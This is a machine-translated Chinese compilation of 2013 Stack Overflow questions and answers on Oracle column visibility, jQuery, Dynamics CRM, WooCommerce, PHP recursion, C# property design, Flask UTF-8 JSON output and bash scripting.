我不确定*隐藏列*或*虚拟列*是否是正确的方法。*细粒度的访问控制*似乎可以提供帮助。我不确定什么是最好的解决方案。IP的限制可能是在侦听器级别完成的？

**问题**：我们如何限制列的可见性，使其仅对特定用户可用？即使在执行“DESC TABLE_WITH_SENSITIVE_DATA”时，所有其他用户都不会看到该列

感谢您的任何提示。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-13T12:38:35.817

最简单的方法是在不包含所有列的表上创建一个视图。不要在表上授予选择权，而只在视图上授予选择权。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-13T12:51:46.007

执行此操作的“正确”方法是使用细粒度访问控制（虚拟专用数据库），如果不满足某些条件，它可以用 NULL 替换列的内容。

请参阅此处的示例：http: [//docs.oracle.com/cd/B28359_01/network.111/b28531/vpd.htm#autoId17](http://docs.oracle.com/cd/B28359_01/network.111/b28531/vpd.htm#autoId17)

如果您感到既贫困又熟练，您可能可以自己构建这种功能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T12:57:58.010

您是否能够修改角色和创建视图？也许您可以创建两个单独的视图并授予对该表的两个不同角色的访问权限。被限制查看敏感数据的所有用户都属于“受限制”角色，而其他用户将有权访问“不受限制”角色。您需要将每个视图的权限授予适当的角色。

请务必注意，更新与视图关联的基础数据存在限制。[如此处](https://stackoverflow.com/questions/763802/how-to-permit-update-of-a-views-results-in-oracle)所述，包含集合运算符、聚合和 GROUP BY DISTINCT 和连接的视图是不可修改的。

# javascript - Javascript 目标链接状态

> ID：14853669
> 
> 赞同：0
> 
> 时间：2013-02-13T12:32:29.120
> 
> 标签：javascript, html, css

我有一些 javascript 可以用两个单独的链接切换两个 div，我想在所选链接旁边添加一个小图像，例如，如果您选择要查看的 div 1，则链接旁边会有一个小项目符号如果您选择 div 2，则 div 2 上会有一个项目符号。继承人的脚本可以请任何人帮忙:)

```
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">

  <style type='text/css'>

  </style>

  <script type='text/javascript' src='http://code.jquery.com/jquery-1.6.2.js'></script>

<script type='text/javascript'>//<![CDATA[ 
$(window).load(function(){
$(function(){

    $('a[id^="link"]').click(function(){
        var vid_id = $(this).attr("id").replace("link", "#testVid");
        $('div[id^="testVid"]').hide();
        $(vid_id).show();
    });
    $('span[id^="close"]').click(function(){
        var vid_id = $(this).attr("id").replace("close", "#testVid");
        $(vid_id).hide();
    });
});

});//]]>  

</script>

</head>
<body>
  <div>
    <a href="#" id="link1">Click Link 1</a><br />
    <a href="#" id="link2">Click Link 2</a><br />

    <div id="testVid1" style="background:pink; height:300px">Test Vid Div 1<br /><br /><span id="close1">CLOSE 1</span></div>
    <div id="testVid2" style="display:none;background:pink; height:300px">Test Vid Div 2<br /><br /><span id="close2">CLOSE 2</span></div>

</div>

</body>

</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:58:41.073

您可以通过多种方式做到这一点。我能想到三个，我敢肯定还有更多。

1.  背景图像和填充
2.  内容：之前
3.  动态改变 DOM（不推荐）

#1 和 #2 中的想法是更改所选元素的 CSS 样式。对于 #1，您将定义如下样式：

```
.selected {
    background-image: url(myselectedimage.png);
    background-repeat: no-repeat;
    background-position: left center;
    padding-left: 20px; /* or whatever the size of your image is */
} 
```

对于＃2，您将使用以下内容：

```
.selected:before {
    content: "\u2219"; /* bullet */
} 
```

然后，您可以执行以下操作从所有内容中删除 .selected 类，并在单击链接时将其添加到所选链接：

```
$('a[id^="link"]').click(function(e){
    $('a[id^="link"]').removeClass('selected');
    $(e.currentTarget).addClass('selected');
    ...
});

$('span[id^="close"]').click(function(){
    $('a[id^="link"]').removeClass('selected');
    ...
}); 
```

方法 #1 的优点是几乎所有现代浏览器都支持它而不会遇到麻烦。#2 的优势在于它更灵活——您可以添加文本、图像、属性以及各种东西，但请注意浏览器支持可能不一致。由于您已经在使用 CSS3 选择器 (^=)，因此您可能没问题。有关更多信息，请参阅[CSS 技巧](http://css-tricks.com/css-content/)。

方法 #3 涉及在链接之前插入和删除 HTML。这是可能的，但很笨重。这是我们在 CSS2 和 3 出现之前的做法。:) 我不会推荐它，但有时它是以可靠的跨浏览器方式完成任务的唯一方法（在这种情况下可能不是）。为此，请在每个链接之前插入一个 <span> 标记，其 ID 可从链接 ID 计算得出（或者您可以使用 CSS 选择器来查找同级）。然后使用 JQuery 的 .html() 方法将 HTML 插入其中，例如：

```
<span id="bullet-link1"></span><a href="#" id="link1">Click Link 1</a><br />
...

<script lang="text/javascript">
$('a[id^="link"]').click(function(e) {
    $('span[id^="bullet-"]').html('');
    $('#bullet-' + e.currentTarget.id).html('&#8226;');
    ...
});
</script> 
```

# dynamics-crm - 如何修改实体视图上的过滤条件

> ID：14853671
> 
> 赞同：0
> 
> 时间：2013-02-13T12:32:37.813
> 
> 标签：dynamics-crm, dynamics-crm-4

我想修改“活动”实体的视图，打开视图并尝试搜索编辑过滤条件选项，但它在视图表单上不可用。

请看下面

![在此处输入图像描述](../Images/52307549ba7271e990c5bac1e02405be.png)

您能否就如何为上述视图添加过滤条件提供建议。或者如何使其在视图表单上的“编辑过滤条件”选项可见。

任何建议将不胜感激。欢迎任何反馈...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:59:10.917

我不知道有什么方法可以做到这一点，但是您可以进行自定义视图，例如更改该实体的默认视图。使用自定义视图，您可以更改一切。

一步一步看这里：[http ://www.powerobjects.com/blog/2008/08/11/creating-and-editing-views/](http://www.powerobjects.com/blog/2008/08/11/creating-and-editing-views/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:48:59.923

你想要的，是不可能实现的。Pedro 的建议是您唯一的选择。创建您自己的活动视图，然后您可以创建自己的过滤器。您绝对不能创建自己的关联视图。公共视图是您唯一希望创建或修改的视图，在这种特殊情况下，您仍然受到限制。

在整个 CRM 中，您会遇到很多这样的问题，即实体、视图或字段被“锁定”。这是从诸如 CRM 之类的平台开始的成本，这些平台是一个仅在一定程度上提供定制的黑盒。

这个特定案例中的问题与活动的性质和各种活动类型有关。实际上，活动并没有传统的记录类型。Activity 实体实际上是一个“指针实体”（注意内部名称“activitypointer”）。活动确实指向其他实体类型（在本例中为活动类型），例如电子邮件活动。电子邮件实体更像是一个传统实体，您可以针对它运行标准查询——但即使它仍然被“锁定”。

这种额外的复杂性使得以编程方式处理活动变得更加困难（例如查询数据、通过插件/SQL 修改数据等），并且在这种特殊情况下，甚至连最基本的定制都变得不可能。

# javascript - 单击两次的功能

> ID：14853672
> 
> 赞同：0
> 
> 时间：2013-02-13T12:32:39.393
> 
> 标签：javascript, jquery, onclick, click, zclip

所以我有以下链接：

```
<div class="upload-copy" id="<?php echo $row['RandomName'] . '-html'; ?>" onclick="javascript:getID(this)">Copy To Clipboard</div> 
```

当点击它应该使用下面的代码复制输入：

```
<script type="text/javascript">
    function getID(theLink){

        var clickid = '#' + theLink.id;
        var inputid = clickid + '-input';

        $(clickid).zclip({
            path:'js/vendor/ZeroClipboard.swf',
            copy:function(){return $(inputid).val();},
            afterCopy:function(){
            $(clickid).html('Copied');
        }
        });
    }
    </script> 
```

现在这有效，但只有当您单击链接两次时。我怎样才能让它在第一次点击时触发？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:37:23.073

我认为您可以只使用 jQuery click 功能。

只需使用单击的类，然后获取 ID 属性并执行其他操作。

```
$(".upload-copy").click(function() {

  var linkid = $(this).attr("id");

  // your other code

}); 
```

希望这是有道理的。

# php - Wordpress WooCommerce 文本属性

> ID：14853676
> 
> 赞同：4
> 
> 时间：2013-02-13T12:32:51.850
> 
> 标签：php, wordpress, woocommerce

我在 Wordpress 中使用 WooCommerce 插件。在该插件中，我需要为每个产品添加文本输入，客户可以在其中填写其他产品详细信息。

我面临的问题是，每当我添加文本属性时，它都会变成一个选择框。请提出一些解决方案。谢谢！

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-06-04T12:27:26.513

你的意思是你的客户应该在前端有这个文本输入字段吗？

如果它只是后端，您可以将其添加到您的functions.php：

```
if (is_admin()){     
// Add the Meta Box  
function add_textfield() {  
    add_meta_box(  
        'textfield', // $id  
        'Custom textfield', // $title   
        'show_textfield_backend', // $callback  
        'product', // $page  
        'normal', // $context  
        'high'  // $priority
    ); 
}  
add_action('add_meta_boxes', 'add_textfield');

// The Callback  
function show_textfield_backend() {  
    global $post;  
    global $wpdb;

    $meta = get_post_meta($post->ID, 'textfield', true);

    // Use nonce for verification  
    echo '<input type="hidden" name="textfield_nonce" value="'.wp_create_nonce(basename(__FILE__)).'" />';  

    _e('Custom textfield: ');
    echo '<input type="text" placeholder="text" id="textfield" class="textfield" name="textfield" ', $meta ? " value='$meta'" : "",' />';       
}

// Save the Data  
function save_textfield($post_id) {  
    global $wpdb;

    // verify nonce  
    if (!wp_verify_nonce($_POST['textfield_nonce'], basename(__FILE__)))   
        return $post_id;
    // check autosave  
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)  
        return $post_id;
    // check permissions
    if ('page' == $_POST['post_type']) {  
        if (!current_user_can('edit_page', $post_id))  
            return $post_id;  
    } elseif (!current_user_can('edit_post', $post_id)) {  
        return $post_id;  
    }

    if ( !wp_is_post_revision( $post_id ) ) {

        $textfield = $_POST['textfield'];
        update_post_meta($post_id, 'textfield', $textfield);

    }  
}
add_action('save_post', 'save_textfield');
} 
```

# javascript - 使用 Extjs 从表单获取数据并将其添加到网格

> ID：14853677
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:32:52.303
> 
> 标签：javascript, extjs

我已经创建了一个表单面板和一个网格。我正在使用 Extjs。现在我希望用户输入的数据在单击保存按钮时插入到网格中。如何从表格中获取数据到网格中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T18:27:17.373

按下按钮时，您需要对网格正在显示的商店中的记录执行 CRUD 操作。当存储中的记录发生更改时，网格将自动重新呈现。

# debugging - 如何同时调试测试和附加项目

> ID：14853678
> 
> 赞同：0
> 
> 时间：2013-02-13T12:32:55.350
> 
> 标签：debugging, visual-studio-2012

我有一个网络应用程序和一组单元测试。我需要同时调试两者。
在 VS2010 中，一切都很简单——我刚刚开始了单元测试，并且自动附加了 Web 应用程序的调试。在 VS2012 中，这不再有效。Web 应用程序正在运行，但没有被调试。有什么想法，我如何同时调试两者？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:43:33.423

将 web-app 设置为解决方案中的启动项目现在开始单元测试（假设它们在类库项目中）。这似乎对我有用，如果我没有将网络应用程序设置为启动项目，我在调试/启动单元测试时会出错（说没有可执行项目被引用）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-09T15:42:00.893

在 Visual Studio 2012 中，我尝试在调试单元测试时附加所有进程。这对我有用，但我找不到自动的东西。

# php - 在返回数组时将php while循环转换为递归函数

> ID：14853681
> 
> 赞同：2
> 
> 时间：2013-02-13T12:33:15.287
> 
> 标签：php, recursion

我已经编写了一个带有while循环的函数，用于从PHP中的DB获取递归父类，它实现了我的目的。但我想知道（实际上很想知道）我怎样才能通过递归函数来做到这一点？如果是，那怎么办？它所做的只是使用 categoroy_id 返回一个父类别数组。如果有不清楚的地方，请告诉我。

```
public function get_recursive_parents($category_id){
        $categories = array();
        $res = $this->db->from('categories')->where('cat_id',$category_id)->get()->row_array();
        $cat_id = $res['parent_id'];
        $categories[] = $res;
        while($cat_id){
            $res = $this->db->from('categories')->where('cat_id',$cat_id)->get()->row_array();
            $categories[] = $res;
            $cat_id = $res['parent_id'];
        }
        return $categories;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:55:27.423

我没有测试过代码，所以我不确定它是否正确：

```
<?php

public function get_recursive_parents($category_id) {
    $categories = array();
    __get_recursive_parents($res['parent_id'], $categories);

    return $categories;
}

public function __get_recursive_parents($cat_id, &$output){
   $res = $this->db->from('categories')->where('cat_id',$cat_id)->get()->row_array();
   $output[] = $res;
   if ($res['parent_id']) {    
       __get_recursive_parents($res['parent_id'], $output);
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:41:36.423

要将其转换为递归函数，它应该像这样工作（未经测试，但逻辑应该相似）。

```
public function get_recursive_parents($category_id){
        $categories = array();
        $res = $this->db->from('categories')->where('cat_id',$category_id)->get()->row_array();
        $cat_id = $res['parent_id'];
        $categories[] = $res;
        while($cat_id) {
            $categories[] = get_recursive_parents($cat_id);
        }
        return $categories;
    } 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-13T12:55:35.330

递归函数中的数据库查询？你的 DBA 可能会把你从后面带走并开枪打死你。

# javascript - 自定义一个 Jquery 插件

> ID：14853682
> 
> 赞同：1
> 
> 时间：2013-02-13T12:33:16.263
> 
> 标签：javascript, jquery, plugins

我正在使用一个名为 Hight 图表的 jquery 插件，它需要在我的 html 中指定一个带有#container 的 div，然后放入脚本标签生成一些图表：

```
$(function() {
        Highcharts.setOptions({
            options: {...},
            }
        });

        var chart = new Highcharts.Chart({
            chart: {
                renderTo: 'container',
                type: 'bar'
            },
            other_options:{...}
    });
}); 
```

因为我需要为我的网页动态列表的每个元素调用这个插件，所以我想创建一个插件来包装这个插件。在关心 DOM 的节点遍历之前，我进行了测试

```
(function($) {
        $.fn.ChartPlugin = function() {
Highcharts.setOptions({
            options: {...},
            }
        });

        var chart = new Highcharts.Chart({
            chart: {
                renderTo: 'container',
                type: 'bar'
            },
            other_options:{...}
          });
      };
    })(jQuery); 
```

但是现在当我调用测试 $.ChartPlugin(); 什么也没发生，有人能告诉我哪里出错了吗？

编辑：我删除了'.fn'并且它有效，但我不明白为什么

# actionscript-3 - 使用共享对象

> ID：14853684
> 
> 赞同：0
> 
> 时间：2013-02-13T12:33:21.420
> 
> 标签：actionscript-3, shared-objects

我对as3相当陌生。我的问题是……如何使用远程共享对象更新服务器？

例如，您在聊天室中的应用程序存储连接的用户列表，并且对所有连接的客户端可见。当用户进入或离开聊天应用程序时，客户端会立即更新。或者，您在私人聊天室和您实时交换消息等

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T14:05:09.490

您需要 Flash Media Server 才能使用远程共享对象。（请参阅[有关 SharedObject 的文档](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/SharedObject.html)。）

如果您没有运行 Flash Media Server（软件）的服务器（计算机），您可以采用不同的方法并使用[实时媒体流协议 (RTMFP)](http://en.wikipedia.org/wiki/Real_Time_Media_Flow_Protocol)来建立对等连接。例如，请参阅以下教程，了解如何使用[flash.net 包](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/package-detail.html)中的类创建 P2P 聊天客户端：[使用 Flash 和点对点创建聊天应用程序](http://designupdate.com/blog/2011/03/28/create-a-chat-app-using-flash-and-peer-to-peer/)。另请参阅[NetGroup 类的文档](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/NetGroup.html)。

# android - FragmentStatePagerAdapter 不调用它的片段

> ID：14853685
> 
> 赞同：4
> 
> 时间：2013-02-13T12:33:23.663
> 
> 标签：android, fragment, pager

我有`FragmentStatePagerAdapter`一个带有寻呼机的片段。在寻呼机内部，我有两个片段可以在它们之间切换。发生的事情是，当我第一次来片段时，一切都正确完成了，但是当我返回并再次返回那里时，基础片段被正常调用`onCreate`，`onCreateView`依此类推，但是在寻呼机中的片段上没有被调用任何东西，`getItem`在适配器上未调用且寻呼机视图为空白。在我拥有的所有片段`setRetainInstance(true)`上，由于旋转行为处理而需要这些片段。

你能帮我解决这个问题吗？

# php - 使用 Smarty 使用 AJAX 加载 php 页面

> ID：14853687
> 
> 赞同：0
> 
> 时间：2013-02-13T12:33:27.270
> 
> 标签：php, jquery, ajax, smarty

我希望使用 AJAX 加载我的网站页面，因此可以节省每次加载页眉和页脚并更改内容。

当我使用 smarty 时，我将如何做呢？

我知道这可能是它需要进入的顺序：

--

请求 PHP

解析 TPL

制作html

在浏览器中显示

--

我只是不确定如何实际进行第二步和第三步。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:39:49.673

做你通常会做的事情。

对于 AJAX：调用一些 javascript 函数，检索要显示的数据，在某个 DOM 位置显示数据

对于 php/smarty：接收请求（来自 ajax，但谁在乎），做 PHP 的东西，填充 smarty 变量，调用 smarty 显示，返回显示数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T13:47:37.517

你可以通过两种方式做到这一点：

调用更改 div 内容的 jquery ajax 函数。

第二 ：

在您想要更改内容的地方使用 iframe。

# ios - 在 Monotouch 中播放铃声/文本音

> ID：14853689
> 
> 赞同：1
> 
> 时间：2013-02-13T12:33:32.107
> 
> 标签：ios, xamarin.ios

在 iOS 的 Monotouch 中，如何播放用于警报/消息/铃声的系统声音？

基本上我希望我的应用程序在关键点播放“旧电话”或“机器人”声音。我不想在我的包中包含 .wav 或 .mp3。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T14:14:05.390

使用 MonoTouch.AudioToolbox.SystemSound.PlaySystemSound。

这是一个关于如何播放不同系统声音的[Apple 示例。](http://developer.apple.com/library/ios/#samplecode/SysSound/Introduction/Intro.html#//apple_ref/doc/uid/DTS40008018)

# c# - 使用 get/set asp.net c# theres too many properties

> ID：14853693
> 
> 赞同：1
> 
> 时间：2013-02-13T12:33:56.810
> 
> 标签：c#, asp.net, get, set

我习惯于创建一个属性类，我将在其中包含所有字段，并且必须编写所有获取/设置属性，然后有另一个数据库类，我将在其中进行所有数据库调用。

```
Properties Class
    private int _intCard
    public int IntCard
    {
        set { _intcard = value;}
    }
Constructor here 
```

现在感觉这不是正确的方法，因为我将处理 120 多个属性，并且必须将这些属性中的每一个都写出来似乎非常耗时。我需要为某些属性添加验证是我选择这种方式的原因，我可以在 set 方法中验证它。任何人都可以提出一种我可以研究的替代方法来完成相同的结果。

```
********************---------------******************* 
```

因此，给出我理解我的设计有缺陷的评论，这就是我想到这个问题的原因。我对如何解决此问题有一个想法，但不知道这是否是解决此问题的正确方法。我搜索了对象设计原则并阅读了它，但需要更多时间来掌握它教给我的东西。现在我想知道这种方法是否正确

我正在跟踪申请人的姓名，地址，电话，传真号码，手机，替代电话，替代地址，配偶相同，然后是孩子，参考资料，公司信息......等等

我不会撒谎，我还不了解抽象类，如果这是我应该采取的方法，我将花更多时间来学习它，但现在希望这将是合适的。

属性类如下：申请者.cs、申请者pouse.cs、申请者联系信息.cs、appreferences.cs......

这符合我应该做的吗？

再次感谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T12:37:44.903

我不禁认为您的对象建模不在这里。如果您有一个具有 120 个属性的类，那么您还没有将该对象划分为单独的角色/职责等。我会考虑（大幅）增加您正在创建的类的数量，这样您的解决方案就会变得更易于管理。

这不会减少您必须处理的属性数量。可能值得考虑不可变对象（您是否需要在构建期间设置这些属性？），和/或使用[Builder](http://en.wikipedia.org/wiki/Builder_pattern)模式来帮助构建。

最后，您需要*公开*这些属性吗？OO 的一个关键部分是*告诉对象为您做事*，而不是获取它们的内容并为它们做事。如果您可以告诉一个对象为您做某事，那么您很可能不需要公开它们的（内部）字段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:45:19.913

在现代 c# 版本中，属性有一个超级紧凑的 sintax：

```
public class Properties {
    public int IntCard { get; set; }
} 
```

这里 c# 为你处理私有变量，这样你可以避免很多击键。对于验证，您可以使用**Data Annotations**。更多信息[在这里](http://www.asp.net/mvc/tutorials/older-versions/models-%28data%29/validation-with-the-data-annotation-validators-cs)

希望能帮助到你

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:47:04.343

请注意，这并不能解决您的设计问题。如果您的数据库在 sql-server 上，为避免键入，您可以使用这样的查询（请根据您的要求进行修改）来获取具有数据类型的属性列表，然后复制并粘贴结果。[SQL 服务器演示](http://sqlfiddle.com/#!3/0b317/1)

```
SELECT  'public ' + CASE DATA_TYPE WHEN 'smallint' THEN 'short' 
                WHEN 'bit' THEN 'bool'
                WHEN 'smalldatetime' THEN 'System.DateTime'
                WHEN 'datetime' THEN 'System.DateTime'
                WHEN 'date' THEN 'System.DateTime'
                WHEN 'uniqueidentifier' THEN 'System.Guid'
                WHEN 'varchar' THEN 'string'
                WHEN 'int' THEN 'int' 
                WHEN 'numeric' THEN 'decimal'
                ELSE DATA_TYPE END 
          + CASE IS_NULLABLE  WHEN 'NO' THEN '' ELSE '?' END
          + ' ' + COLUMN_NAME 
          + ' { get; set; }' AS def
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_NAME = 'YourTableName'
ORDER BY IS_NULLABLE, ORDINAL_POSITION 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:51:32.167

完全同意@brian-agnew 的观点，如果您在 1 个类中有这么多属性，那么您可能需要进行一些重构，因为您几乎可以肯定没有足够的关注点分离。

然而，即使经过一些重构，您仍将拥有这些属性，因此值得查看数据验证属性。例如，这里是如何将它们与 MVC 一起使用：[http ://www.asp.net/mvc/tutorials/older-versions/models-(data)/validation-with-the-data-annotation-validators- cs](http://www.asp.net/mvc/tutorials/older-versions/models-%28data%29/validation-with-the-data-annotation-validators-cs)。然后，您可以使用[自动实现的](http://msdn.microsoft.com/en-us/library/bb384054.aspx)属性：

```
public int IntCard { get; set; } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T15:51:00.180

蒂姆，

根据您的编辑，您看起来像是在正确的路线上。您应该将属性分解为特定项目，例如：

```
public class Person
    {
        public string GivenName { get; set; }
        public string Surname { get; set; }
        public ContactInfo ContactInformation { get; set; }
    }

public class Applicant : Person
    {
        public Person Spouse { get; set; }
        public List<Person> Children { get; set; }
        public List<Reference> References { get; set; }
    }

public class ContactInfo
    {
        [Required]
        [DataType(DataType.PhoneNumber)]
        public string PhoneNumber { get; set; }

        [DataType(DataType.EmailAddress)]
        public string EmailAddress { get; set; }

        public Address PrimaryAddress { get; set; }
        public Address AlternativeAddress { get; set; }
    } 
```

所以这里的关键点是

1.  类被分解成可管理、可重用的块
2.  数据注释（ContactInfo 类中的必需和数据类型）用于验证属性
3.  属性不再需要显式私有变量

PS有关数据注释的更多信息：http: [//msdn.microsoft.com/en-us/library/dd901590 (v=vs.95).aspx](http://msdn.microsoft.com/en-us/library/dd901590%28v=vs.95%29.aspx)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-13T15:56:28.833

通过阅读评论，您看起来至少需要两个类 Person，Address 类似：

```
public class Person 
{
  Guid Id {get; set;}
  string Name {get; set;}
  // ad infinitum the truely unique things that relate to an Individual

  Address BusinessAddress {get; set;}
  Address HomeAddress {get; set;}
  Person Spouse {get; set;}
}

public class Address
{
  Guid Id {get; set;}
  Line1 {get; set;}
  // ad infinitum all the truly unique things that relate to an address
} 
```

以上内容本质上是伪代码，不应被解读为“这正是如何去做”，例如，我没有说明属性是私有/公共/受保护的还是确实提供了构造函数。

但它确实展示了如何使用其他类作为属性，并且在“配偶”的情况下创建非常丰富和深入的对象层次结构（配偶可能包含地址和可能的另一个配偶 - 循环引用啊！）可以填充并用于制作代码更具可读性，并将代码的职责分离出来，将“概念/实体/域”封装到一个单元中，该单元的工作就是“那个特定的东西”。可能值得在这里查看 OOP 概念，如封装、继承等（基本上是 OO 的四个原则），以了解对象应该代表什么，这个链接有一个简短的介绍，应该可以帮助您决定如何打破类并构造更多有用的对象。

[http://codebetter.com/raymondlewallen/2005/07/19/4-major-principles-of-object-oriented-programming/](http://codebetter.com/raymondlewallen/2005/07/19/4-major-principles-of-object-oriented-programming/)

# python - utf-8 中的 python jsonify 字典

> ID：14853694
> 
> 赞同：47
> 
> 时间：2013-02-13T12:33:58.093
> 
> 标签：python, json, utf-8, flask

我想将 json 数据转换为 utf-8

我有一个清单`my_list = []`

然后许多像这样将unicode值附加到列表中

```
my_list.append(u'ტესტ')

return jsonify(result=my_list) 
```

它得到

```
{
"result": [
"\u10e2\u10d4\u10e1\u10e2",
"\u10e2\u10dd\u10db\u10d0\u10e8\u10d5\u10d8\u10da\u10d8"
]
} 
```

* * *

## 回答 #1

> 赞同：92
> 
> 时间：2016-09-18T19:12:05.970

使用以下配置添加 UTF-8 支持：

```
app.config['JSON_AS_ASCII'] = False 
```

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2013-02-13T12:49:42.573

请改用标准库[`json`模块](http://docs.python.org/library/json.html)，并`ensure_ascii`在编码时将关键字参数设置为 False，或者对以下内容执行相同操作[`flask.json.dumps()`](http://flask.pocoo.org/docs/latest/api/#flask.json.dumps)：

```
>>> data = u'\u10e2\u10d4\u10e1\u10e2'
>>> import json
>>> json.dumps(data)
'"\\u10e2\\u10d4\\u10e1\\u10e2"'
>>> json.dumps(data, ensure_ascii=False)
u'"\u10e2\u10d4\u10e1\u10e2"'
>>> print json.dumps(data, ensure_ascii=False)
"ტესტ"
>>> json.dumps(data, ensure_ascii=False).encode('utf8')
'"\xe1\x83\xa2\xe1\x83\x94\xe1\x83\xa1\xe1\x83\xa2"' 
```

请注意，您仍然需要将结果显式编码为 UTF8，因为在这种情况下`dumps()`函数会返回一个`unicode`对象。

您可以通过在 Flask 应用程序配置中[设置](http://flask.pocoo.org/docs/latest/config/#JSON_AS_ASCII)[为 False](http://flask.pocoo.org/docs/latest/config/#JSON_AS_ASCII)`jsonify()`将其设为默认值（并再次使用） 。[`JSON_AS_ASCII`](http://flask.pocoo.org/docs/latest/config/#JSON_AS_ASCII)

**警告**：不要在非 ASCII 安全的 JSON 中包含不受信任的数据，然后插入 HTML 模板或在 JSONP API 中使用，因为这样可能导致语法错误或打开跨站点脚本漏洞。这是因为[JSON 不是 Javascript 的严格子集](http://timelessrepo.com/json-isnt-a-javascript-subset)，并且当禁用 ASCII 安全编码时，U+2028 和 U+2029 分隔符不会转义为`\u2028`和`\u2029`序列。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2016-10-07T14:38:38.437

如果您仍然想使用烧瓶的 json 并确保 utf-8 编码，那么您可以执行以下操作：

```
from flask import json,Response
@app.route("/")
def hello():
    my_list = []
    my_list.append(u'ტესტ')
    data = { "result" : my_list}
    json_string = json.dumps(data,ensure_ascii = False)
    #creating a Response object to set the content type and the encoding
    response = Response(json_string,content_type="application/json; charset=utf-8" )
    return response 
```

＃我希望这有帮助

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-01-08T13:41:20.133

就我而言，上述解决方案还不够。（在 GCP App Engine 柔性环境中运行烧瓶）。我最终做了：

```
json_str = json.dumps(myDict, ensure_ascii = False, indent=4, sort_keys=True)
encoding = chardet.detect(json_str)['encoding']
json_unicode = json_str.decode(encoding)
json_utf8 = json_unicode.encode('utf-8')
response = make_response(json_utf8)
response.headers['Content-Type'] = 'application/json; charset=utf-8'
response.headers['mimetype'] = 'application/json'
response.status_code = status 
```

# bash - 比较两个变量的shell脚本

> ID：14853695
> 
> 赞同：1
> 
> 时间：2013-02-13T12:34:03.357
> 
> 标签：bash, shell, sh

我创建了一个脚本来更新 iptables 中的一些 ipaddress。在此，我正在描述我面临的问题。

问题：

1.  脚本中的两个变量之间没有进行比较
2.  在脚本结束时，我需要执行一个命令，即；服务重启/停止等和命令的输出应该在执行脚本时可见。

1）这里比较两个变量字符串：

```
BASE=172.31.0.0
CMD=172.31.1.0

if [[ "$CMD" == "$BASE" ]]; then
   echo "ip are same"
else
   echo "not matched"
fi 
```

但执行上述脚本时没有响应/输出。这里没有发生比较。请提出解决此问题的最佳解决方案。

2）执行脚本后我需要重新启动iptables：

```
BASE=172.31.0.0
CMD=172.31.1.0

if [[ "$CMD" == "$BASE" ]]; then
   echo "ip are same"
else
   echo "not matched"
fi

service iptables restart
iptables -nvL 
```

脚本应该显示最后两行（命令）的输出。请建议我最好的解决方案以及如何以最佳方式做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T01:13:13.827

这很奇怪。这*应该可以工作*，所以如果它不工作，你忘了提到一些重要的事情。

这个脚本是如何执行的？您是简单地键入 ./script 还是由某些服务（如 cron）执行？

以下是一些调试建议：

1.  健全性检查：查看 bash 是否有效（也许您的登录 shell 不是 bash，所以您没有注意到）。在终端运行：

    ```
    /bin/bash -c 'echo hello world' 
    ```

2.  它打印你好世界，对吧？这个怎么样：

    ```
    /bin/bash -c 'BASE=172.31.0.0; CMD=172.31.1.0; if [[ "$CMD" == "$BASE" ]]; then echo "ip are same"; else echo "not matched"; fi' 
    ```

    如果以上任何一项都不起作用，那么您的 bash 安装有问题。

3.  不要使用 ./script.sh 执行脚本，而是像这样运行它：

    ```
    /bin/bash script.sh 
    ```

4.  没有什么？运行这个：

    ```
    file script.sh 
    ```

    如果它以“带有 CRLF 行终止符”之类的内容结尾，那么 cdarke 就确定了：该文件是在 Windows 上使用不正确的工具创建的。在 Linux 上重新创建它或使用 dos2unix。但无论如何，我对此表示怀疑，因为使用 CRLF 结尾的文件我得到了这个打印：

    ```
    bash: ./script.sh: /bin/bash^M: bad interpreter: No such file or directory 
    ```

    而不是什么都没有。

5.  把这些放在文件的开头：

    ```
    set -x 
    ```

    （在**#!/bin/bash**下方，如果有的话）。这确保将打印调试跟踪，在执行时显示每个命令。

6.  如果仍然没有显示任何内容..把它放在你的脚本中（如果你把它放在**set -x下面）：**

    ```
    touch /tmp/hi-this-is-strange 
    ```

    然后在运行脚本后检查是否有**/tmp/hi-this-is-strange**文件。

# powershell - 用于扫描目标目录的 Powershell 脚本

> ID：14853698
> 
> 赞同：0
> 
> 时间：2013-02-13T12:34:26.113
> 
> 标签：powershell

尝试在 Powershell 中扫描目标目录时出现错误。

